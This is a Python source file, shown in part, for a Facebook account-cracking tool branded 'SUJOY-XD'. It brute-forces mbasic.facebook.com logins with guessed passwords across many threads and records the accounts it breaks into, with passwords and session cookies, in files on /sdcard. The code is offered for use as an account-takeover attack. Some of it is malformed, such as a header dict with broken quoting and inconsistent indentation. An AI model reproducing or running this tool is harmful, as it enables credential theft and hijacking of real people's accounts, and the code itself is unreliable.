...
#THIS SC Owner : Sujoy Sarker
#-----------------[ IMPORT-MODULE ]-------------------
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
os.system("xdg-open https://www.facebook.com/profile.php?id=100090619820318")
...
try:
	...
	print(' \x1b[1;91m\x1b[1;96m\x1b[1;92m \x1b[1;96m[SUJOY-XD')
...
\033[1;32m---------------------------------------------------------
\033[1;32m  AUTHOR    : Sujoy Sarker 
\033[1;32m  GITHUB    : Sujoy Sárkèr 
\033[1;32m  FACEBOOK  : Sujoy Sarker 
...
def menu():
	...
	_SUJOY_(f'\033[1;92m[\033[1;34m1\033[1;92m] FILE CLONE')
	_SUJOY_(f'\033[1;92m[\033[1;92m\033[1;34m2\033[1;92m] RANDOM CLONE')
	_SUJOY_(f'\033[1;92m[\033[1;92m\033[1;34m3\033[1;92m] EMAIL CLONE')
	_SUJOY_(f'[\033[1;92m\033[1;34m4\033[1;92m] CONTACT ME')
	_SUJOY_(f'\033[1;92m[\033[1;34m0\033[1;92m]\033[0;91m EXIT')
	_____SUJOY_____ = input('\033[1;92m[\033[1;34m🙂\033[1;92m]\033[0;92mCHOOSE :\x1b[1;92m ')
	if _____SUJOY_____ in ['1']:
		C1()
	if _____SUJOY_____ in ['2']:
		Y2()
	if _____SUJOY_____ in ['3']:
		BER()
	if _____SUJOY_____ in ['4']:
		os.system("xdg-open https://www.facebook.com/profile.php?id=100000448332183")
	if _____SUJOY_____ in ['0']:
		exit()
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo} [SUJOY] {h}[{k}{loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{''.format(loop/float(len(id)))}] ")
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r\x1b[1;91m [\033[1;91mSUJOY-CP\033[1;91m] \033[1;91m '+idf+ ' | '+pw+'')
				#open('/sdcard/'+SUJOY-file clone,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			    ...
			    #print ()
				print(f'\r\x1b[1;92m [\033[1;92mSUJOY-OK\033[1;92m] \033[1;92m '+idf+ ' | '+pw+'')
				print('\r\x1b[1;96m [\033[1;93mCOOKIES\033[1;96m]\033[1;91m= \033[1;97m '+kuki+'')
				cek_apk(session,coki)
				open('/sdcard/SUJOY-FILE-CLONE-OK','a').write(idf+'|'+pw+'|'+kuki+'\n')
				akun.append(idf+'|'+pw)
				break
...
def Y2():
    ...
    for nmbr in range(limit):
        ...
        user.append(nmp)
    with ThreadPool(max_workers=50) as SUJOY:
        clear()
        tl = str(len(user))      
    ...
    try:
        for ps in pwx:
        	...
        	if 'c_user' in log_cookies:
        	    ...
        	    cid = coki[151:166]
        	    print ('')
        	    print('\033[1;92m[\033[1;92mSUJOY.OK\033[1;92m] \033[1;92m'+uid+' | '+ps+ '\033[1;91m = \033[1;96m '+tahunng(cid))
        	    print ('\033[1;93m [\033[1;96mCookie \033[1;93m]\033[1;91m = \033[1;92m '+coki+'')
        	    cek_apk(session,coki)
        	    open('/sdcard/SUJOY-RANDOM.OK.txt', 'a').write( uid+' | '+ps+'\n')
        	    oks.append(uid)
        	    break 
        	elif 'checkpoint' in log_cookies:
        	    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
        	    cid = coki[141:156]
        	    print('\033[1;91m[SUJOY.CP]\033[1;93m[😪]\033[1;91m'+uid+' | '+ps+'\033[1;94m'+tahunng(uid))
              #  print ('\033[1;32m[‎😔]\033[1;91m = \033[1;34m'+coki+'  \033[0;32m')
                #cek_apk(session,coki)
        	    open('/sdcard/SUJOY-RANDOM-CP.txt', 'a').write( cid+' | '+ps+' \n')
        	    cps.append(uid)
        	    break          
        	else:
        	    continue
        loop+=1
        sys.stdout.write('\r%s[SUJOY-XD]\033[1;32m-%s/%s][OK-%s]\033[1;92m[CP-%s] \r'%(bi,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
...
def sujoy(uid,pwv,tl):
    ...
    try:
        for ps in pwv:
            ...
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority': 'mbasic.facebook.com', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'en-US,en;q=0.9', 'cache-control': 'max-age=0', 'sec-ch-prefers-color-scheme': 'dark', 'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"', 'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Linux"', 'sec-ch-ua-platform-version': '""', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'none', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Linux; Android 10; en-us; 10; T-Mobile myTouch 3G Slide Build/GRI40)I148V)L850E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.9997.0.4459.139 Mobile Safari/533.1'}
            'method': 'GET',
            'scheme': 'https', 
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            ...
            if 'c_user' in log_cookies:
        	    ...
        	    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
        	    cid = coki[141:156]
        	    print('\033[1;91m[SUJOY.CP]\033[1;93m[😪]\033[1;91m'+uid+' | '+ps+'\033[1;91m '+tahunng(uid))
              #  print ('\033[1;32m[😔]\033[1;91m = \033[1;34m'+coki+'  \033[0;32m')
                #cek_apk(session,coki)
        	    open('/sdcard/SUJOY-RANDOM-CP.txt', 'a').write( cid+' | '+ps+' \n')
        	    cps.append(uid)
